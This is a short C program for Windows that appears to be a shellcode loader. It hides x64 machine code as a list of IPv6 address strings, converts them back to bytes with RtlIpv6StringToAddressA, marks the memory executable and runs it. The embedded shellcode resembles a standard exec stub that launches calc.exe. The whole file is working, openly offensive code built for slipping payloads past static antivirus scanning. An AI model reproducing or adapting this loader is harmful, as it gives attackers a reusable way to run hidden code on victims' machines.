#include <Windows.h>
#include <ip2string.h>
#include <In6addr.h>

const PCSTR ipv6_payload[] = {
	"9990:9B90:9B9F:F89B:9F91:9093:FC48:83E4",
	"F0E8:C000:0000:4151:4150:5251:5648:31D2",
	"6548:8B52:6048:8B52:1848:8B52:2048:8B72",
	"5048:0FB7:4A4A:4D31:C948:31C0:AC3C:617C",
	"022C:2041:C1C9:0D41:01C1:E2ED:5241:5148",
	"8B52:208B:423C:4801:D08B:8088:0000:0048",
	"85C0:7467:4801:D050:8B48:1844:8B40:2049",
	"01D0:E356:48FF:C941:8B34:8848:01D6:4D31",
	"C948:31C0:AC41:C1C9:0D41:01C1:38E0:75F1",
	"4C03:4C24:0845:39D1:75D8:5844:8B40:2449",
	"01D0:6641:8B0C:4844:8B40:1C49:01D0:418B",
	"0488:4801:D041:5841:585E:595A:4158:4159",
	"415A:4883:EC20:4152:FFE0:5841:595A:488B",
	"12E9:57FF:FFFF:5D48:BA01:0000:0000:0000",
	"0048:8D8D:0101:0000:41BA:318B:6F87:FFD5",
	"BBF0:B5A2:5641:BAA6:95BD:9DFF:D548:83C4",
	"283C:067C:0A80:FBE0:7505:BB47:1372:6F6A",
	"0059:4189:DAFF:D563:616C:632E:6578:6500",
};

#define array_len sizeof(ipv6_payload) / sizeof(PCSTR)
#define payload_size array_len * 16

typedef VOID PAYLOAD(VOID);

INT main(VOID) {
	PBYTE payload_buff;
	IN6_ADDR addr;
	PSTR term;
	DWORD old_protection;

	payload_buff = VirtualAlloc(
		NULL,
		payload_size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	for (DWORD i = 0; i < array_len; i++) {
		RtlIpv6StringToAddressA(ipv6_payload[i], &term, &addr);
		CopyMemory(payload_buff + i * sizeof(addr), &addr, sizeof(addr));
	}

	if ( ! VirtualProtect(payload_buff, payload_size, PAGE_EXECUTE_READ, &old_protection) ) {
		puts("VirtualProtect failed");
		return 1;
	}

	PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

	fn_payload();

	return 0;
}